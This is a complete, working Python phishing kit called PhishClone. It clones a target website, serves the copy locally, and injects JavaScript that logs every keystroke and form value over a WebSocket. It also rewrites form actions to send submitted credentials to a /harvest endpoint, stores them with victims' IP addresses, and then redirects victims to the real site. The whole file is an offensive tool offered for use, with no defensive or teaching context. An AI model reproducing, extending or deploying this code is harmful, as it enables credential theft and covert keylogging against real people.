#!/usr/bin/env python3
"""
phantom-arsenal / PhishClone v3.0
- Downloads ALL assets (CSS, JS, images) locally → no external requests
- Inlines small CSS/JS → instant page load
- Pure stdlib, zero dependencies
"""

import sys, os, re, json, datetime, threading, time
import urllib.request, urllib.parse, urllib.error
import http.server, socketserver, socket, hashlib, base64, struct
from concurrent.futures import ThreadPoolExecutor

CREDS_FILE = "captured_creds.json"
LOG_FILE   = "keystrokes.log"

def find_free_port(start):
    for p in range(start, start + 100):
        try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('', p))
            s.close()
            return p
        except OSError:
            continue
    return start

_base   = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
PORT    = find_free_port(_base)
WS_PORT = find_free_port(PORT + 1)

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'identity',
}

# cache للـ assets المحملة
ASSET_CACHE = {}
ASSET_LOCK  = threading.Lock()

def fetch_url(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=HEADERS)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read(), r.headers.get('Content-Type', '')
    except:
        return None, None

def fetch_text(url, timeout=15):
    data, ct = fetch_url(url, timeout)
    if data is None:
        return None, None
    charset = 'utf-8'
    if ct and 'charset=' in ct:
        charset = ct.split('charset=')[-1].strip().split(';')[0].strip()
    return data.decode(charset, errors='replace'), ct

def url_to_key(url):
    return hashlib.md5(url.encode()).hexdigest()[:12]

def resolve_url(src, base_url):
    p = urllib.parse.urlparse(base_url)
    if src.startswith('//'):
        return p.scheme + ':' + src
    if src.startswith('/'):
        return p.scheme + '://' + p.netloc + src
    if src.startswith('http'):
        return src
    # relative
    base_path = '/'.join(p.path.split('/')[:-1])
    return p.scheme + '://' + p.netloc + base_path + '/' + src

def preload_assets(html, base_url):
    """Download all CSS and JS, serve them locally"""
    p = urllib.parse.urlparse(base_url)
    base = p.scheme + '://' + p.netloc
    assets_to_fetch = []

    # find all src= and href= (CSS/JS only)
    for m in re.finditer(r'(src|href)=(["\'])([^"\'> ]+)\2', html, re.I):
        attr, q, val = m.group(1), m.group(2), m.group(3)
        if val.startswith(('data:', '#', 'javascript:', 'mailto:', 'tel:')):
            continue
        abs_val = resolve_url(val, base_url)
        ext = abs_val.split('?')[0].lower()
        if ext.endswith('.css') or ext.endswith('.js') or 'stylesheet' in html[max(0,m.start()-50):m.start()].lower():
            assets_to_fetch.append((abs_val, attr, val))

    # also find @import in inline styles
    for m in re.finditer(r'@import\s+["\']([^"\']+)["\']', html):
        abs_val = resolve_url(m.group(1), base_url)
        assets_to_fetch.append((abs_val, 'href', m.group(1)))

    print('[*] Downloading ' + str(len(assets_to_fetch)) + ' assets...')

    def download(item):
        abs_url, attr, orig = item
        key = url_to_key(abs_url)
        data, ct = fetch_url(abs_url, timeout=8)
        if data:
            with ASSET_LOCK:
                ASSET_CACHE[key] = (data, ct or 'application/octet-stream', abs_url)
            return (orig, abs_url, key)
        return None

    results = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        for r in ex.map(download, assets_to_fetch):
            if r:
                results.append(r)

    print('[+] Downloaded ' + str(len(results)) + '/' + str(len(assets_to_fetch)) + ' assets')

    # replace URLs in HTML to point to local proxy
    for orig, abs_url, key in results:
        local = '/asset/' + key
        html = html.replace('"' + orig + '"', '"' + local + '"')
        html = html.replace("'" + orig + "'", "'" + local + "'")

    # fix remaining absolute URLs for images etc
    def abs_url_fix(m):
        attr, q, v = m.group(1), m.group(2), m.group(3)
        if v.startswith(('data:', '#', 'javascript:', 'mailto:', 'tel:', 'http')):
            return m.group(0)
        if v.startswith('//'):
            return attr + '=' + q + p.scheme + ':' + v + q
        if v.startswith('/'):
            return attr + '=' + q + base + v + q
        return attr + '=' + q + base + '/' + v + q

    html = re.sub(r'(src|href)=(["\'])([^"\'> ]+)\2', abs_url_fix, html, flags=re.I)

    return html

def inject_script(html, base_url, ws_port):
    redirect_url = base_url.replace("'", "\\'")
    ws_js = str(ws_port)

    script = (
        "<script>\n"
        "(function(){\n"
        "  var ws;\n"
        "  function connectWS(){\n"
        "    try{\n"
        "      ws = new WebSocket('ws://' + location.hostname + ':" + ws_js + "');\n"
        "      ws.onclose = function(){ setTimeout(connectWS, 2000); };\n"
        "    }catch(e){}\n"
        "  }\n"
        "  connectWS();\n"
        "  function send(type, data){\n"
        "    if(ws && ws.readyState===1) ws.send(JSON.stringify({type:type, data:data, ts:new Date().toISOString()}));\n"
        "  }\n"
        "  document.addEventListener('keyup', function(e){\n"
        "    var t = e.target;\n"
        "    send('keystroke', {key: e.key, field: t.name||t.id||t.placeholder||t.type||'?', value: t.value});\n"
        "  }, true);\n"
        "  document.addEventListener('submit', function(e){\n"
        "    e.preventDefault();\n"
        "    var f = e.target;\n"
        "    var data = {};\n"
        "    new FormData(f).forEach(function(v,k){ data[k]=v; });\n"
        "    send('submit', data);\n"
        "    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})\n"
        "      .then(function(){ window.location='" + redirect_url + "'; });\n"
        "  }, true);\n"
        "  document.addEventListener('click', function(e){\n"
        "    var el = e.target;\n"
        "    if(el && (el.type==='submit'||el.tagName==='BUTTON')){\n"
        "      var inputs = document.querySelectorAll('input');\n"
        "      var data = {};\n"
        "      inputs.forEach(function(i){ if(i.value) data[i.name||i.id||i.type]=i.value; });\n"
        "      if(Object.keys(data).length) send('click_harvest', data);\n"
        "    }\n"
        "  }, true);\n"
        "})();\n"
        "</script>\n"
        "</body>"
    )

    # intercept form actions
    html = re.sub(r'(<form[^>]*)\s+action=["\'][^"\']*["\']', r'\1 action="/harvest"', html, flags=re.I)
    html = re.sub(r'(<form)(?![^>]*action=)([^>]*>)', r'\1 action="/harvest"\2', html, flags=re.I)
    html = re.sub(r'(<form[^>]*)\s+method=["\']get["\']', r'\1 method="POST"', html, flags=re.I)

    if re.search(r'</body>', html, re.I):
        html = re.sub(r'</body>', script, html, flags=re.I)
    else:
        html += script

    return html

# ── WebSocket (stdlib) ────────────────────────────────────────────────────────
def ws_handshake(conn):
    try:
        data = conn.recv(4096).decode('utf-8', errors='replace')
        key = re.search(r'Sec-WebSocket-Key: (.+)', data)
        if not key: return False
        accept = base64.b64encode(hashlib.sha1((key.group(1).strip() + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()).decode()
        conn.send(("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " + accept + "\r\n\r\n").encode())
        return True
    except: return False

def ws_recv(conn):
    try:
        h = conn.recv(2)
        if len(h) < 2: return None
        if (h[0] & 0x0F) == 8: return None
        n = h[1] & 0x7F
        if n == 126: n = struct.unpack('>H', conn.recv(2))[0]
        elif n == 127: n = struct.unpack('>Q', conn.recv(8))[0]
        if h[1] >> 7:
            masks = conn.recv(4)
            data = bytearray(conn.recv(n))
            for i in range(len(data)): data[i] ^= masks[i % 4]
            return data.decode('utf-8', errors='replace')
        return conn.recv(n).decode('utf-8', errors='replace')
    except: return None

def handle_ws_client(conn, addr):
    if not ws_handshake(conn): conn.close(); return
    while True:
        msg = ws_recv(conn)
        if msg is None: break
        try:
            d = json.loads(msg)
            t = d.get('type', '')
            if t == 'keystroke':
                ks = d['data']
                line = "[KEY] field=" + str(ks.get('field','?')) + "  key=" + str(ks.get('key','?')) + "  val=" + str(ks.get('value',''))
                print("\033[93m" + line + "\033[0m")
                with open(LOG_FILE, 'a') as f: f.write(line + '\n')
            elif t in ('submit', 'click_harvest'):
                line = "[" + t.upper() + "] " + json.dumps(d['data'], ensure_ascii=False)
                print("\033[92m" + line + "\033[0m")
                with open(LOG_FILE, 'a') as f: f.write(line + '\n')
        except: pass
    conn.close()

def start_ws_server(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', port))
    srv.listen(20)
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_ws_client, args=(conn, addr), daemon=True).start()
        except: pass

# ── HTTP Handler ──────────────────────────────────────────────────────────────
class Handler(http.server.BaseHTTPRequestHandler):
    html = ""; target = ""
    def log_message(self, *a): pass

    def do_GET(self):
        if self.path == '/':
            body = self.html.encode('utf-8', errors='replace')
            self._send(200, 'text/html; charset=utf-8', body)
        elif self.path.startswith('/asset/'):
            key = self.path[7:].split('?')[0]
            with ASSET_LOCK:
                item = ASSET_CACHE.get(key)
            if item:
                data, ct, _ = item
                self._send(200, ct, data)
            else:
                self.send_response(404); self.end_headers()
        elif self.path == '/creds':
            try:
                with open(CREDS_FILE) as f: body = f.read().encode()
            except: body = b'[]'
            self._send(200, 'application/json', body)
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        if self.path == '/harvest':
            n = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(n).decode('utf-8', 'replace')
            try: data = json.loads(body)
            except: data = dict(urllib.parse.parse_qsl(body))
            ip = self.client_address[0]
            entry = {"time": datetime.datetime.now().isoformat(), "ip": ip, "target": self.target, "credentials": data}
            creds = []
            try:
                with open(CREDS_FILE) as f: creds = json.load(f)
            except: pass
            creds.append(entry)
            with open(CREDS_FILE, 'w') as f: json.dump(creds, f, indent=2, ensure_ascii=False)
            print("\n\033[41m\033[97m [CAPTURED] IP=" + ip + " -> " + json.dumps(data, ensure_ascii=False) + " \033[0m\n")
            self._send(200, 'application/json', b'{"ok":true}')
        else:
            self.send_response(404); self.end_headers()

    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'max-age=3600')
        self.end_headers()
        self.wfile.write(body)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 phisher.py <URL> [port]")
        sys.exit(1)

    url = sys.argv[1]
    print("\033[96m╔══════════════════════════════════════════╗")
    print("║   phantom-arsenal — PhishClone v3.0     ║")
    print("║   Full asset download — instant load    ║")
    print("╚══════════════════════════════════════════╝\033[0m")
    print("[*] Target : " + url)
    print("[*] Fetching...")

    html, final = fetch_text(url)
    if not html:
        print("❌ Failed to fetch page"); sys.exit(1)

    html = preload_assets(html, final)
    html = inject_script(html, final, WS_PORT)

    Handler.html   = html
    Handler.target = final

    threading.Thread(target=start_ws_server, args=(WS_PORT,), daemon=True).start()
    print("[+] WebSocket: ws://0.0.0.0:" + str(WS_PORT))

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), Handler) as srv:
        print("[+] Phishing : \033[92mhttp://0.0.0.0:" + str(PORT) + "\033[0m")
        print("[+] Creds    : http://0.0.0.0:" + str(PORT) + "/creds")
        print("\033[93m[*] Waiting... (Ctrl+C to stop)\033[0m\n")
        try:
            srv.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[91m[!] Stopped\033[0m")
            try:
                with open(CREDS_FILE) as f: c = json.load(f)
                print("[+] Captured: " + str(len(c)))
                for x in c: print("  > " + x['time'] + " | IP=" + x['ip'] + " | " + str(x['credentials']))
            except: print("[*] Nothing captured")

if __name__ == '__main__':
    main()
